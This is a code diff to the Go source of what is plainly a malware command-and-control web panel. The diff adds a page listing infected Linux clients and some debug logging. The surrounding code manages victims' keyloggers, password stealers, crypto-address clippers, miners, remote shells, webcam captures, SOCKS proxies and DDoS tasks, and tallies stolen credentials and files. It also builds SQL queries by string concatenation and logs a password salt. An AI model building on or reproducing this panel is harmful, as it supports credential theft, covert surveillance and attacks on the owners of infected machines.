@@ -8,7 +8,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/gorilla/mux"
 	"html"
 	"html/template"
 	"io"
@@ -18,6 +17,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/gorilla/mux"
 )
 
 //func redirect(w http.ResponseWriter, req *http.Request) {
@@ -122,7 +123,7 @@ import (
 //}
 
 func GoServerWithFrontend() {
-	//go http.ListenAndServe(":"+serverPort, http.HandlerFunc(redirect))
+	//go http.ListenAndServe("localhost:"+serverPort, http.HandlerFunc(redirect))
 	Log.Println("Starting MUX Routing...")
 	router := mux.NewRouter()
 	//DDoSHandler
@@ -130,6 +131,9 @@ func GoServerWithFrontend() {
 	router.HandleFunc("/", dashboardHandle)
 	router.HandleFunc("/clients/windows", clientsWindowsHandle)
 	router.HandleFunc("/manage/windows", manageWindowsHandle)
+	// linux clients
+	router.HandleFunc("/clients/linux", clientsLinuxHandle)
+	// router.HandleFunc("/manage/linux", manageLinuxHandle)
 	router.HandleFunc("/ddos", DDoSHandler)
 	router.HandleFunc("/socks", socksPageHandler)
 	router.HandleFunc("/tasks", tasksHandle)
@@ -191,7 +195,7 @@ func GoServerWithFrontend() {
 
 	Server := &http.Server{
 		Handler:      router,
-		Addr:         ":" + serverPort,
+		Addr:         "10.37.129.2:" + serverPort,
 		TLSConfig:    cfg,
 		WriteTimeout: time.Second * 15,
 		ReadTimeout:  time.Second * 15,
@@ -290,6 +294,7 @@ func toggleClientFeature(w http.ResponseWriter, r *http.Request) {
 		uid := r.FormValue("uid")
 		feature := r.FormValue("feature")
 		state := r.FormValue("state")
+		fmt.Println("Setting feature: ", feature)
 		_, Err := DB.Exec("UPDATE `windows_clients` SET `"+feature+"`='"+state+"' WHERE UID=?", uid)
 		if Err == nil {
 			//_, _ = DB.Exec("INSERT INTO commands( UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES( ?, ?, ?, ?, ?, ?, ?)", uid, html.EscapeString(Command), html.EscapeString(strings.ToUpper(RealName)), html.EscapeString(Parameters), "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
@@ -667,6 +672,7 @@ func updateClient(w http.ResponseWriter, r *http.Request) {
 	err := json.Unmarshal(Decrypted, &jsonData)
 	flag := GetCountryCode(jsonData.IP)
 	go dataStat(false, ClientUID, int(r.ContentLength))
+	fmt.Println(jsonData)
 	if err == nil {
 		_, _ = DB.Exec("UPDATE `windows_clients` SET `ClientVersion`='"+jsonData.ClientVersion+"',`IP`='"+jsonData.IP+"',`Flag`='"+flag+"',`OperatingSystem`='"+jsonData.OS+"',`GPU`='"+jsonData.GPU+"',`Abilities`='"+jsonData.Abilities+
 			"',`SysInfo`='"+jsonData.SysInfo+"',`PingTime`='"+jsonData.PingTime+"',`Jitter`='"+jsonData.Jitter+"',`UserAgent`='"+jsonData.UserAgent+"',`InstanceKey`='"+jsonData.InstanceKey+
@@ -751,7 +757,7 @@ func newClient(w http.ResponseWriter, r *http.Request) {
 				jsonData.AntiVirus, jsonData.ClipperState, jsonData.BTC, jsonData.XMR, jsonData.ETH, jsonData.Custom, jsonData.Regex,
 				jsonData.MinerState, jsonData.Socks5State, jsonData.ReverseProxyState, jsonData.RemoteShellState, jsonData.KeyloggerState, jsonData.FileHunterState, jsonData.PasswordStealerState, jsonData.Screenshot, jsonData.Webcam, "New Client", time.Now().Format("02 Jan 06 15:04 -0700"), time.Now().Format("02 Jan 06 15:04 -0700"))
 			LiveMessage = "success|" + jsonData.UID + "|New Client Connection"
-			//	fmt.Println(err)
+			fmt.Println("New Client Information:", jsonData.SysInfo)
 			_, err := os.Stat("./clients/windows/" + ClientUID + "/")
 
 			if os.IsNotExist(err) {
@@ -872,6 +878,9 @@ func settingsClient(w http.ResponseWriter, r *http.Request) {
 	ClientUID := r.Form.Get("id")
 	var UID, Clipper, BTC, XMR, ETH, Custom, CustomRegex, Socks5, SocksConnect, Keylogger, output string // rework for other settings later
 	err := DB.QueryRow("SELECT UID, ClipperState, BTC, XMR, ETH, Custom, Regex, Socks5State, SocksConnect, KeyloggerState  FROM windows_clients WHERE UID=?", ClientUID).Scan(&UID, &Clipper, &BTC, &XMR, &ETH, &Custom, &CustomRegex, &Socks5, &SocksConnect, &Keylogger)
+	if err != nil {
+		fmt.Println("Error querying client settings: ", err)
+	}
 	go dataStat(false, ClientUID, int(r.ContentLength))
 	if err == nil {
 		clientSettings := ClientSettings{UID, Clipper, BTC, XMR, ETH, Custom, CustomRegex, Socks5, SocksConnect, Keylogger}
@@ -880,11 +889,11 @@ func settingsClient(w http.ResponseWriter, r *http.Request) {
 		Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
 		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
 		_, _ = DB.Exec("UPDATE `windows_clients` SET `sentBytes`='"+strconv.Itoa(len(encoded))+"' WHERE UID=?", ClientUID)
-		fmt.Fprintf(w, encoded)
+		fmt.Fprintln(w, encoded)
 	} else { //Not found in Database... New Client?
 		Encrypted := XXTeaEncrypt([]byte("failed"), []byte(EncryptionPassword))
 		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
-		fmt.Fprintf(w, encoded)
+		fmt.Fprintln(w, encoded)
 	}
 }
 
@@ -1247,6 +1256,7 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 
 			Err := DB.QueryRow("SELECT Username, Password FROM admins WHERE Username=?", user).Scan(&databaseUsername, &databasePassword)
 			if Err != nil {
+				Log.Println("Error executing query :", Err)
 				Log.Println("Failed login attempt [" + ip + "] {" + user + "}")
 				login := LoginPage{"window.onload = alertFunction;", "Error", "Wrong Username or Password!"}
 				parsedTemplate, _ := template.ParseFiles("static/login.html")
@@ -1256,6 +1266,7 @@ func loginHandler(w http.ResponseWriter, r *http.Request) {
 					return
 				}
 			} else {
+				Log.Println("md5Salt", md5Salt)
 				if databasePassword == md5Hash(md5Salt+"+"+pass) {
 					_, _ = DB.Exec("UPDATE `admins` SET `LastIP`='" + ip + "' WHERE Username='" + html.EscapeString(user) + "'")
 					_, _ = DB.Exec("UPDATE `admins` SET `LastLogin`='" + time.Now().Format("02 Jan 06 15:04 -0700") + "' WHERE Username='" + html.EscapeString(user) + "'")
@@ -1376,7 +1387,6 @@ func manageWindowsHandle(w http.ResponseWriter, r *http.Request) {
 		data.Name = Name
 		data.Username = Username
 		data.ClientUID = ClientUID
-
 		data.ClientScreenshot = "../../files/windows/" + ClientUID + "/screenshot.png?rand=" + randomString(15)
 		data.ClientWebcam = "../../files/windows/" + ClientUID + "/camera.png?rand=" + randomString(15)
 
@@ -1505,6 +1515,21 @@ func manageWindowsHandle(w http.ResponseWriter, r *http.Request) {
 				data.BrowserTables = append(data.BrowserTables, table)
 			}
 		}
+
+		// //Applications
+		// body, err := ioutil.ReadFile("./clients/windows/" + ClientUID + "/files/stealer/Installed.txt")
+
+		// if err != nil {
+		// 	fmt.Println(err)
+		// } else {
+		// 	// fmt.Println(string(body))
+		// 	temp := strings.Split(string(body), "\n")
+		// 	for index, line := range temp {
+		// 		line = strings.Replace(line, "\t", ",", -1)
+		// 		fmt.Println(index, line)
+		// 	}
+
+		// }
 		//Keylogs
 		files, _ = ioutil.ReadDir("./clients/logs/" + ClientUID + "/files/logs/")
 
@@ -1588,6 +1613,60 @@ func clientsWindowsHandle(w http.ResponseWriter, r *http.Request) {
 		}
 
 		parsedTemplate, _ := template.ParseFiles("static/windows_clients.html")
+		Err := parsedTemplate.Execute(w, data)
+		if Err != nil {
+			Log.Println("Error executing template :", Err)
+			return
+		}
+	} else {
+		login := LoginPage{"window.onload = alertFunction;", "warning", "You are not logged in!"}
+		parsedTemplate, _ := template.ParseFiles("static/login.html")
+		Err := parsedTemplate.Execute(w, login)
+		if Err != nil {
+			Log.Println("Error executing template :", Err)
+			return
+		}
+	}
+}
+func clientsLinuxHandle(w http.ResponseWriter, r *http.Request) {
+	Username := getUserName(r)
+	if Username != "" {
+		var UID, ClientVersion, IP, FLAG, OS, ABList, AB, LR, cLR string
+		data := ClientsPage{}
+
+		data.Name = Name
+
+		data.TotalClients = strconv.Itoa(TotalClients)
+		data.ActiveClients = strconv.Itoa(ActiveClients)
+		data.Username = Username
+		data.StolenCredentials = strconv.Itoa(StolenCredentials)
+		data.StolenFiles = strconv.Itoa(StolenFiles)
+		data.ServerPort = serverPort
+
+		rows, _ := DB.Query("SELECT UID, ClientVersion, IP, Flag, OperatingSystem, Abilities, LastResponse FROM linux_clients")
+		for rows.Next() {
+			_ = rows.Scan(&UID, &ClientVersion, &IP, &FLAG, &OS, &ABList, &LR)
+			if strings.Contains(ABList, "true") {
+				AB = ` <i class="fas fa-crown"></i> `
+			}
+			if strings.Contains(ABList, "false") {
+				AB = ` <i class="fas fa-user"></i> `
+			}
+
+			i, _ := strconv.ParseFloat(Timeout, 32)
+
+			then, _ := time.Parse(time.RFC822Z, LR)
+			duration := time.Since(then)
+			if duration.Minutes() <= i {
+				cLR = `<span style="color: #00ff00;">` + LR + `</span>`
+			} else {
+				cLR = `<span style="color: #ff0000;">` + LR + `</span>`
+			}
+			table := ClientsTable{FLAG, IP, UID, ClientVersion, OS, template.HTML(AB), template.HTML(cLR)}
+			data.ClientTables = append(data.ClientTables, table)
+		}
+
+		parsedTemplate, _ := template.ParseFiles("static/linux_clients.html")
 		Err := parsedTemplate.Execute(w, data)
 		if Err != nil {
 			Log.Println("Error executing template :", Err)
